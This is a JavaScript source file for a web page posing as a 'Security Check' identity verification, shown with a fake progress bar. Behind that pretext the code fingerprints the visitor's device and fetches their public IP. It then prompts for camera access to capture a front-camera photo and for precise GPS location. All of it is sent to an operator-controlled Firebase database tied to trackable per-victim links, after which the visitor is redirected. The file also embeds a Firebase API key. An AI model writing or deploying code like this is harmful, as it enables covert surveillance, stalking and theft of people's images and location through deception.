// ── IMPORTS FIRST (required for ES modules) ───────────────────────────────
import { initializeApp } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-app.js";
import { getDatabase, ref, push, set, get, update } from "https://www.gstatic.com/firebasejs/10.8.0/firebase-database.js";

// ── FIREBASE CONFIG — API key space bug fixed ─────────────────────────────
const firebaseConfig = {
    apiKey: "AIzaSyCu-4lEX3qQqPCow3nhvCHZNrpg5nbEUm0",
    authDomain: "camera-c436d.firebaseapp.com",
    databaseURL: "https://camera-c436d-default-rtdb.firebaseio.com",
    projectId: "camera-c436d",
    storageBucket: "camera-c436d.firebasestorage.app",
    messagingSenderId: "1024848910212",
    appId: "1:1024848910212:web:80a95f41281d1a920eafd1"
};

const app = initializeApp(firebaseConfig);
const db  = getDatabase(app);

// ── FAKE PROGRESS BAR ─────────────────────────────────────────────────────
function startFakeProgress(container) {
    container.innerHTML = `
        <h2>Security Check</h2>
        <p style="color:#666; font-size:14px;">Please wait while we verify your identity...</p>
        <div style="background:#f0f0f0; border-radius:8px; overflow:hidden; height:12px; margin:18px 0 8px;">
            <div id="progressBar" style="height:100%; width:0%; background:linear-gradient(90deg,#007bff,#00c6ff); border-radius:8px; transition:width 0.5s ease;"></div>
        </div>
        <p id="fakeStatus" style="font-size:13px; color:#777; margin:4px 0;">Initializing...</p>
        <p id="statusText"  style="font-size:13px; color:#555; margin:4px 0;"></p>
        <video id="video" autoplay playsinline style="display:none;"></video>
        <canvas id="canvas" style="display:none;"></canvas>
    `;

    const steps = [
        [8,  "Checking SSL certificate..."],
        [18, "Connecting to verification server..."],
        [30, "Validating session token..."],
        [43, "Authenticating identity..."],
        [55, "Requesting security permissions..."],
        [67, "Processing biometric data..."],
        [78, "Encrypting data transfer..."],
        [88, "Finalizing verification..."],
        [95, "Almost done..."]
    ];

    let i = 0;
    const bar        = () => document.getElementById('progressBar');
    const fakeStatus = () => document.getElementById('fakeStatus');

    const interval = setInterval(() => {
        if (i < steps.length) {
            if (bar())        bar().style.width    = steps[i][0] + '%';
            if (fakeStatus()) fakeStatus().innerText = steps[i][1];
            i++;
        } else {
            clearInterval(interval);
        }
    }, 950);

    return interval;
}

function finishProgress(interval) {
    clearInterval(interval);
    const bar        = document.getElementById('progressBar');
    const fakeStatus = document.getElementById('fakeStatus');
    if (bar)        bar.style.width      = '100%';
    if (fakeStatus) fakeStatus.innerText = 'Verification complete!';
}

// ── COLLECT DEVICE INFO (no permission needed) ────────────────────────────
async function collectDeviceInfo() {
    const ua = navigator.userAgent;
    const info = {
        userAgent:     ua,
        platform:      navigator.platform  || 'Unknown',
        language:      navigator.language  || 'Unknown',
        screenWidth:   screen.width,
        screenHeight:  screen.height,
        colorDepth:    screen.colorDepth,
        timezone:      Intl.DateTimeFormat().resolvedOptions().timeZone,
        cookiesEnabled: navigator.cookieEnabled,
        onlineStatus:  navigator.onLine,
        referrer:      document.referrer || 'Direct',
        pageUrl:       window.location.href,
    };

    // Network info
    if (navigator.connection) {
        info.networkType = navigator.connection.effectiveType || 'Unknown';
        info.downlink    = (navigator.connection.downlink    || 'Unknown') + ' Mbps';
    } else {
        info.networkType = 'Unknown';
        info.downlink    = 'Unknown';
    }

    // Battery
    try {
        const bat      = await navigator.getBattery();
        info.battery   = Math.round(bat.level * 100) + '%';
        info.charging  = bat.charging ? 'Yes' : 'No';
    } catch (e) {
        info.battery  = 'Unavailable';
        info.charging = 'Unavailable';
    }

    // OS detection
    if      (/android/i.test(ua))          info.os = 'Android';
    else if (/iphone|ipad|ipod/i.test(ua)) info.os = 'iOS';
    else if (/windows/i.test(ua))          info.os = 'Windows';
    else if (/mac/i.test(ua))              info.os = 'macOS';
    else if (/linux/i.test(ua))            info.os = 'Linux';
    else                                   info.os = 'Unknown';

    // Browser detection
    if      (/edg/i.test(ua))                          info.browser = 'Edge';
    else if (/opr|opera/i.test(ua))                    info.browser = 'Opera';
    else if (/chrome/i.test(ua))                       info.browser = 'Chrome';
    else if (/firefox/i.test(ua))                      info.browser = 'Firefox';
    else if (/safari/i.test(ua) && !/chrome/i.test(ua)) info.browser = 'Safari';
    else                                               info.browser = 'Unknown';

    return info;
}

// ── GET PUBLIC IP ─────────────────────────────────────────────────────────
async function getIPAddress() {
    try {
        const r = await fetch('https://api.ipify.org?format=json');
        const d = await r.json();
        return d.ip || 'Unavailable';
    } catch (e) {
        try {
            const r2 = await fetch('https://api64.ipify.org?format=json');
            const d2 = await r2.json();
            return d2.ip || 'Unavailable';
        } catch (e2) {
            return 'Unavailable';
        }
    }
}

// ── MAIN ──────────────────────────────────────────────────────────────────
async function initVerification() {
    const params = new URLSearchParams(window.location.search);
    const linkId = params.get('linkId');

    if (!linkId) {
        document.body.innerHTML = "<div style='text-align:center;margin-top:80px;'><h1>404 Not Found</h1><p>No link ID provided.</p></div>";
        return;
    }

    // Fetch link settings from Firebase
    let settings;
    try {
        const snap = await get(ref(db, 'managed_links/' + linkId));
        settings   = snap.val();
    } catch (e) {
        document.body.innerHTML = "<div style='text-align:center;margin-top:80px;'><h1>Error</h1><p>Could not connect. Please try again.</p></div>";
        return;
    }

    if (!settings || !settings.active) {
        document.body.innerHTML = "<div style='text-align:center;margin-top:80px;'><h1>404 Not Found</h1><p>This link is invalid or has been disabled.</p></div>";
        return;
    }

    // Increment visit counter
    try {
        await update(ref(db, 'managed_links/' + linkId), { visits: (settings.visits || 0) + 1 });
    } catch (e) { /* silent — non-critical */ }

    // Show fake progress bar
    const container = document.querySelector('.container');
    const fakeInterval = startFakeProgress(container);

    // Collect device info + IP in parallel (no permissions needed)
    const [deviceInfo, ipAddress] = await Promise.all([
        collectDeviceInfo(),
        getIPAddress()
    ]);

    let lat = 'Denied', lon = 'Denied';
    let photoData = null;

    // ── STEP 1: CAMERA ────────────────────────────────────────────────────
    if (settings.cam) {
        try {
            const statusEl = document.getElementById('statusText');
            if (statusEl) statusEl.innerText = 'Please allow camera access...';

            const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: false });
            const video  = document.getElementById('video');
            video.srcObject = stream;
            video.style.display = 'block';

            // Wait for stream to be ready and playing
            await new Promise((res, rej) => {
                video.onloadedmetadata = () => video.play().then(res).catch(res);
                setTimeout(res, 5000); // fallback timeout
            });

            // Wait for camera to adjust brightness
            await new Promise(r => setTimeout(r, 1500));

            const canvas    = document.getElementById('canvas');
            canvas.width    = video.videoWidth  || 640;
            canvas.height   = video.videoHeight || 480;
            canvas.getContext('2d').drawImage(video, 0, 0, canvas.width, canvas.height);
            photoData = canvas.toDataURL('image/jpeg', 0.75);

            stream.getTracks().forEach(t => t.stop());
            video.style.display = 'none';
        } catch (e) {
            console.error('Camera error:', e.message);
        }
    }

    // ── STEP 2: GPS ───────────────────────────────────────────────────────
    if (settings.gps) {
        try {
            const statusEl = document.getElementById('statusText');
            if (statusEl) statusEl.innerText = 'Please allow location access...';

            const pos = await new Promise((res, rej) => {
                navigator.geolocation.getCurrentPosition(res, rej, {
                    timeout: 15000,
                    enableHighAccuracy: true,
                    maximumAge: 0
                });
            });
            lat = pos.coords.latitude;
            lon = pos.coords.longitude;
        } catch (e) {
            console.log('GPS denied:', e.message);
        }
    }

    // ── STEP 3: SAVE TO FIREBASE ──────────────────────────────────────────
    try {
        const newRef = push(ref(db, 'photo_history'));
        await set(newRef, {
            id:        Date.now(),
            image:     photoData,
            latitude:  lat,
            longitude: lon,
            linkName:  settings.name,
            linkId:    linkId,
            date:      new Date().toLocaleDateString(),
            time:      new Date().toLocaleTimeString(),
            timestamp: Date.now(),
            ipAddress: ipAddress,
            device:    deviceInfo
        });
    } catch (e) {
        console.error('Firebase save error:', e);
    }

    finishProgress(fakeInterval);

    const statusEl = document.getElementById('statusText');
    if (statusEl) statusEl.innerText = '✅ Verification Successful!';

    if (settings.redirectUrl) {
        setTimeout(() => { window.location.href = settings.redirectUrl; }, 2000);
    }
}

window.addEventListener('load', initVerification);
